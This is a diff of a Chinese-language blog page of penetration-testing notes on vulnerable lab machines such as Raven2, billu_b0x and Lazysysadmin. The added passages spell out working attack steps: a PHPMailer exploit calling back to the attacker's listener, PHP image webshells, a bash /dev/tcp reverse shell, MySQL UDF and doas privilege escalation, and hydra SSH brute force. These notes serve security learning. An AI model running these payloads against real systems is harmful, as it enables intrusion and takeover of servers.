@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2020-02-03</span>
-            <span class="time">06:29:36</span>
+            <span class="time">03:17:52</span>
           </span>
           
         </div>
@@ -119,7 +119,7 @@
 &#125;</code></pre>
 
 <p>溢出前二十个字节就可以溢出<br>payloads<br><code>simon000000000000000/bin/sh</code><br>跳转到/bin/sh<br>whoami<br>pwd</p>
-<h1 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h1><p>如果发现他是wordpress后台可以利用wpscan扫描一下目录<br><code>wpscan --url http://ip/wordpress/ --wp-content-dir -ep -et -eu</code><br>可以获得用户名,ssh尝试登陆 通常密码也是用户名<br>利用LinEnum.sh 发现mysql由root权限就可以考虑这个漏洞<br>windows下<br>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/<br>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。<br>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。<br>拥有可以将udf.dll写入相应目录的权限。<br>我们可以在kali中<br><code>searchsploit mysql udf</code><br>切换当前目录到/var/www/html/wordpress目录下，并查找wp-config文件，这个文件会存储着MySQL数据库的密码。udf的使用需要我们登陆数据库<br>找到udf对应的文件后<br>先将原始的C语言代码编译成.so文件，然后再上传到靶机中运行来利用这个MySQL漏洞。<br>第一步是编译。</p>
+<h1 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h1><p>前提一定是我们拿到了对方的shell,一般可以用ssh<br>如果发现他是wordpress后台可以利用wpscan扫描一下目录<br><code>wpscan --url http://ip/wordpress/ --wp-content-dir -ep -et -eu</code>(更新问题未解决)<br><strong>可以获得用户名,ssh尝试登陆,通常密码也是用户名,这时已经进入对方系统，如果用不了用别的方法拿到shell,再用如下wp-config的密码进入数据库</strong><br>利用LinEnum.sh 发现mysql由root权限就可以考虑这个漏洞<br>windows下<br>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/<br>如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。<br>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。<br>拥有可以将udf.dll写入相应目录的权限。<br>我们可以在kali中<br><code>searchsploit mysql udf</code><br>此时我们已经在对方的shell中,这一点不要忘<br>切换当前目录到/var/www/html/wordpress目录下，并查找wp-config文件，这个文件会存储着MySQL数据库的密码。udf的使用需要我们登陆数据库<br>找到udf对应的文件后<br>先将原始的C语言代码编译成.so文件，然后再上传到靶机中运行来利用这个MySQL漏洞。<br>第一步是编译。</p>
 <pre><code class="hljs undefined">searchsploit –m <span class="hljs-number">1518</span><span class="hljs-selector-class">.c</span>
 gcc -g -shared -Wl,-soname,<span class="hljs-number">1518</span><span class="hljs-selector-class">.so</span> -o <span class="hljs-number">1518</span><span class="hljs-selector-class">.so</span> <span class="hljs-number">1518</span><span class="hljs-selector-class">.c</span> -lc</code></pre>
 
@@ -137,6 +137,46 @@ gcc -g -shared -Wl,-soname,<span class="hljs-number">1518</span><span class="hlj
 cd /root
 ls
 cat flag4.txt</code></pre>
+
+<h1 id="raven2实战-phpMailer提权"><a href="#raven2实战-phpMailer提权" class="headerlink" title="raven2实战(phpMailer提权)"></a>raven2实战(phpMailer提权)</h1><p>dirbuster和dirb比dirsearch看起来更有效<br>可以通过phpMailer在发送邮箱的时候执行远程漏洞&lt;5.2.17<br>searchsploit phpMailer<br>searchsploit -m 40974.py(我的kali没有python3 所以wget到主机执行)<br>需要修改的参数,contact.php是他们的上传页面,生成后门tt.php,这里我连接到了kali的6666端口,本季的apache被我修改了,无法启动qaq,注意一定要先nc -lvp 666再访问10.211.55.11/tt.php</p>
+<pre><code class="hljs undefined">target = <span class="hljs-string">'http://10.211.55.11/contact.php'</span>
+backdoor = <span class="hljs-string">'/tt.php'</span>
+s.connect((\\\<span class="hljs-string">'10.211.55.2\\\'</span>,<span class="hljs-number">6666</span>))
+-OQueueDirectory=/tmp -X/<span class="hljs-keyword">var</span>/www/html/tt.php</code></pre>
+
+<p>拿到shell后 提权<br>sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+<h1 id="fourandsix2"><a href="#fourandsix2" class="headerlink" title="fourandsix2"></a>fourandsix2</h1><p>发现有nfs服务时,意味着有目录等着我们去挂载<br>打开msf</p>
+<pre><code class="hljs undefined">msfconsole
+<span class="hljs-meta">&gt;</span><span class="bash"> search nsf</span>
+<span class="hljs-meta">&gt;</span><span class="bash">use auxiliary/scanner/nfs/nfsmount</span>
+<span class="hljs-meta">&gt;</span><span class="bash">show options 配置选项</span>
+exploit</code></pre>
+
+<p>可以发现挂载的目录,使用nfspysh挂载到/tmp/storage,因为/tmp全局可见<br><code>mount -t nfs 192.168.190.134:/home/user/storage /mnt</code>进去目录后可以看ls有啥,发现有一个7z文件 但需要密码<br>破解工具已放在kali,破解后一大堆文件,有id_rsa和id_rsa.sub<br>然后破解rsa的密码,工具已放在kali中,用户名存在id_rsa.sub中,这一点一定注意<br>然后登陆<br><code>ssh -i id_rsa 用户名@10.211.55.12</code><br>登陆后 <code>uname -a</code>查看内核信息并且查看相应漏洞<br>发现没有,我们只能另外寻找提权方式<br>使用find查询和su相同作用的文件<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<h1 id="doas提权"><a href="#doas提权" class="headerlink" title="doas提权"></a>doas提权</h1><p>doas是BSD系列系统下的权限管理工具，类似于Debian系列下的sudo命令,我们可以利用它来提权<br>查看doas的配置文件doas.conf，可以看到doas 允许用户以root权限通过less 查看/var/log/authlog日志文件</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">cd</span> <span class="hljs-string">/etc</span>
+cat doas.conf
+doas <span class="hljs-string">/usr/bin/less</span> <span class="hljs-string">/var/log/authlog</span>
+按v进入编辑模式 :!<span class="hljs-string">/bin/sh</span>退出
+<span class="hljs-keyword">cd</span> <span class="hljs-string">/root</span></code></pre>
+
+<h1 id="billu-b0x-靶机渗透实战"><a href="#billu-b0x-靶机渗透实战" class="headerlink" title="billu_b0x 靶机渗透实战"></a>billu_b0x 靶机渗透实战</h1><p>这次的靶机没有安装成,只能还原一下<br>页面先进去以后,会告诉你有个sql注入的页面<br>我们用sqlmap -r<br>但是post的包我们怎么利用呢,我们拿本地的试一下.<br>sqlmap -u “网址” –forms 自动查看参数<br>然后抓包 保存文件 sqlmap -r txt –level=5<br>发现注入无望后,开始扫目录dirb<br>爆出来的目录中发现了phpinfo和phpmyadmin<br>发现了 allow_url_fopen 是on<br>想到了本地文件包含、读取,发现有个test.php可以file文件包含,是post提交查看etc/passwd<br>利用此方法查看别的文件发现phpmyadmin的账号密码,登陆进去后发现了,首页的账号密码<br><strong>利用图片马提权</strong><br>这是另一种思路,我感觉可以对付用post上传的文件,get上传的我感觉直接上传php即可<br>打开一个图片,在结尾写上<br><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code><br>这样我们在上传的图片的同时,传入cmd参数可以远程执行漏洞<br>使用burp执行命令：用POST请求执行cmd命令：POST /panel.php?cmd=cat /etc/passwd<br>POST的body中包含cmd.jpg图片马：load=/uploaded_images/cmd.jpg&amp;continue=continue<br>那么我怎么才能连接蚁剑呢,我们可以利用这个来写入后端的php代码,我们传入cmd=ls -al时可以哪个文件有可写的权限,发现uploaded_images有这个权限</p>
+<pre><code class="hljs undefined">http://<span class="hljs-number">192.168</span>.<span class="hljs-number">8.129</span>/panel.php?<span class="hljs-keyword">cmd</span><span class="bash">=<span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php eval($_POST['</span>mm<span class="hljs-string">']);?&gt;'</span> &gt;&gt; uploaded_images/shell.php</span>
+load=/uploaded_images/<span class="hljs-keyword">cmd</span>.<span class="bash">jpg&amp;<span class="hljs-built_in">continue</span>=<span class="hljs-built_in">continue</span></span></code></pre>
+
+<p>然后蚁剑连接<br>两种姿势提权</p>
+<p>kali命令行里输入nc -lvnp 6666开始监听，同时burp的post请求中执行echo “bash -i &gt;&amp; /dev/tcp/xxxxxx/6666 0&gt;&amp;1″ | bash，注意要将此命令先经过URL编码才能发送</p>
+<p>然后bp cmd等于编码后的编码<br>输入命令 python -c ‘import pty;pty.spawn(“/bin/bash”)’即可<br>第二种<br>uname -a和cat /etc/issus查看系统的版本信息和内核为：Ubuntu 12.04.5 LTS、Linux indishell 3.13.0-32-generic<br>searchsploit ubuntu 12.04<br>kali发送<br><code>nc -q 1 -lp 4444&lt;c文件</code><br>shell端接受<br><code>nc -nv xxxxx 4444&gt;/tmp/保存文件</code><br><code>gcc 文件 -o exp</code><br><code>./exp即可</code><br>总结一下,这个难度中等,还要多加练习</p>
+<h1 id="Lazysysadmin渗透实战"><a href="#Lazysysadmin渗透实战" class="headerlink" title="Lazysysadmin渗透实战"></a>Lazysysadmin渗透实战</h1><p>全扫描<br><code>nmap -sS -Pn -p- -A -n ip</code><br>扫到irc 用msf打一下 一般选用生成后门的<br>smb枚举探测<br>看到139和445端口，这都是高危的共享端口，自己也在用linux的共享服务，先用enum4linux -S 枚举出靶机的共享目录<br><code>enum4linux -S 192.168.8.130</code><br>在kali中输入</p>
+<pre><code class="hljs undefined">smbclient xxxxx
+<span class="hljs-builtin-name">get</span> 文件 就会下载下来</code></pre>
+
+<p>在wordpress的网站中我们可以发现用户名,决定尝试ssh登陆,至于密码我们在deet.txt中发现了<br>get flag<br><strong>总结</strong></p>
+<hr>
+<p>遇到wordpress的网站上的首先我们要扫目录,最重要的目标就是找到wp-config.php这里有数据库的账号密码,之后可以用几种姿势ssh<br>然后提权</p>
+<h1 id="Machine-Matrix渗透实战"><a href="#Machine-Matrix渗透实战" class="headerlink" title="Machine_Matrix渗透实战"></a>Machine_Matrix渗透实战</h1><p>老套路 扫主机和目录发现一些猫腻<br>进入31337端口 告诉你要解密,查看源代码有base64,去解码<br>告诉你文件存在一个Cypher.matrix,这是一个brainfuck(第一次见),解码方法存在主机上<br>然后告诉你账号密码,但密码后两位没有说,自己爆破吧,著名的黑客爆破工具pydictor<br><code>python3 pydictor.py -base dLc --len 2 2 --head k1ll0r</code><br>然后生成字典爆破ssh 用户名为guest<br><code>hydra -l guest -P base_141052.txt ssh://192.168.8.132</code><br>时间有点慢,大概爆了一分钟</p>
+<p>``</p>
+
         </div>
       </div>
     </div>
